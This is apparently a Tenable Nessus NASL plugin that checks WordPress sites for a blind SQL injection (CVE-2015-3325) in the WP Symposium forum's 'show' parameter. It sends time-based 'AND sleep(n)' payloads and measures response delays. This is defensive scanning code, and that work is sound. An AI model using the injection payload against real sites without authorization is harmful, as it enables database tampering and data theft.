#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(83525);
  script_version("$Revision: 1.7 $");
  script_cvs_date("$Date: 2016/12/12 19:19:06 $");

  script_cve_id("CVE-2015-3325");
  script_bugtraq_id(74237);
  script_osvdb_id(120821);
  script_xref(name:"EDB-ID", value:"37080");

  script_name(english:"WP Symposium Plugin for WordPress forum.php 'show' Parameter SQL Injection");
  script_summary(english:"Attempts to inject SQL code via the 'show' parameter.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server hosts a web application that is affected by a
SQL injection vulnerability.");
  script_set_attribute(attribute:"description", value:
"The WordPress WP Symposium Plugin installed on the remote host is
affected by a SQL injection vulnerability due to a failure to properly
sanitize user-supplied input to the 'show' parameter of the forum.php
script. An unauthenticated, remote attacker can exploit this issue to
inject or manipulate SQL queries in the back-end database, resulting
in the manipulation or disclosure of arbitrary data.");
  script_set_attribute(attribute:"see_also", value:"http://openwall.com/lists/oss-security/2015/04/14/5");
  # http://packetstormsecurity.com/files/131801/WordPress-WP-Symposium-15.1-SQL-Injection.html
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8e78198c");
  script_set_attribute(attribute:"see_also", value:"https://plugins.trac.wordpress.org/changeset/1153677/wp-symposium");
  script_set_attribute(attribute:"solution", value:
"Upgrade to WP Symposium Plugin version 15.4 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:ND");
  script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H");
  script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:X");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Wordpress WP Symposium 15.1 SQL Injection");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2015/04/14");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/05/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/05/18");

  script_set_attribute(attribute:"potential_vulnerability", value:"true");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wpsymposium:wp_symposium");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:wordpress:wordpress");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("wordpress_detect.nasl", "wordpress_wp_symposium_gid_sql_injection.nasl");
  script_require_keys("installed_sw/WordPress", "www/PHP", "Settings/ParanoidReport");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

app = "WordPress";
get_install_count(app_name:app, exit_if_zero:TRUE);

port = get_http_port(default:80, php:TRUE);

install = get_single_install(
  app_name : app,
  port     : port
);

dir = install['path'];
url_path = install['Redirect'];
install_url = build_url(port:port, qs:dir);

plugin = 'WP Symposium';
# Check KB first
installed = get_kb_item("www/"+port+"/webapp_ext/"+plugin+" under "+dir);
if (!installed)
  audit(AUDIT_WEB_APP_EXT_NOT_INST, app, install_url, plugin + " plugin");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

pid = NULL;
pid_url = NULL;

if (!isnull(url_path)) url = url_path;
else url = dir + "/";

# First send a request to try and determine if the forum component is in
# use with WP Symposium
res = http_send_recv3(
  method       : "GET",
  port         : port,
  item         : url,
  exit_on_fail : TRUE
);

if ("/wp-content/plugins/wp-symposium/" >< res[2])
{
  match = eregmatch(
    pattern : 'var __wps__ = \\{.*,"forum_url":"(.*[^"])","mail_url',
    string  : res[2]
  );

  if (!empty_or_null(match[1]))
  {
    # Get page id
    if ("page_id" >< match[1])
    {
      match2 = eregmatch(pattern:'\\?page_id=(.+)', string:match[1]);
      if (!empty_or_null(match2[1]))
        pid = match2[1];
    }
    else
    # Get page url (permalinks in use)
    {
      pid_dir =  ereg_replace(pattern:"/", string:match[1], replace:"");
      match2 = eregmatch(pattern:"^http:(.+)(\\.*)", string:pid_dir);
      if (!empty_or_null(match2[2]))
      {
        pid_url = ereg_replace(pattern:"\\", string:match2[2], replace:"");
      }
    }
  }
}
else
  exit(0, "Nessus was unable to locate a " + plugin + " forum on the " + app + " install located at " + install_url);

if (empty_or_null(pid) && empty_or_null(pid_url))
  exit(0, "Nessus was unable to find a forum associated with the " + plugin + " plugin installed on the " + app + " install located at " + install_url);

stimes = make_list(3, 5, 7);
num_queries = max_index(stimes);
vuln = FALSE;

for (i = 0; i < max_index(stimes); i++)
{
  http_set_read_timeout(stimes[i] + 10);
  then = unixtime();

  if (!empty_or_null(pid))
    attack_url = "?page_id=" +pid+ "&cid=1&show=1%20AND%20sleep(" +stimes[i]+ ");";
  else
    attack_url = pid_url + "/?cid=1&show=1%20AND%20sleep(" +stimes[i]+ ");";

  res = http_send_recv3(
    method       : "GET",
    port         : port,
    item         : url + attack_url,
    exit_on_fail : TRUE
  );
  now = unixtime();
  ttime = now - then;

  time_per_query += 'Query #' + (i+1) + ' : ' + query + ' Sleep Time : ' +
  stimes[i] + ' secs  Response Time : ' + ttime + ' secs\n';

  overalltime += ttime;

  if ( (ttime >= stimes[i]) && (ttime <= (stimes[i] + 5)) )
  {
    vuln = TRUE;
    output =
      'Blind SQL Injection Results' +
      '\n  Query                          : sleep(' +stimes[i]+ ')' +
      '\n  Response time                  : ' + ttime + ' secs' +
      '\n  Number of queries executed     : ' + num_queries +
      '\n  Total test time                : ' + overalltime + ' secs' +
      '\n  Time per query                 : ' +
      '\n'+ "  " + time_per_query;

  #  output = 'The request produced a sleep time of ' + ttime + ' seconds.';
    continue;
  }
  else
    vuln = FALSE;
}
if (!vuln)
  audit(AUDIT_WEB_APP_EXT_NOT_AFFECTED, app, install_url, plugin + " plugin");

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  sqli       : TRUE,  # Sets SQLInjection KB key
  request    : make_list(install_url + attack_url),
  output     : output
);
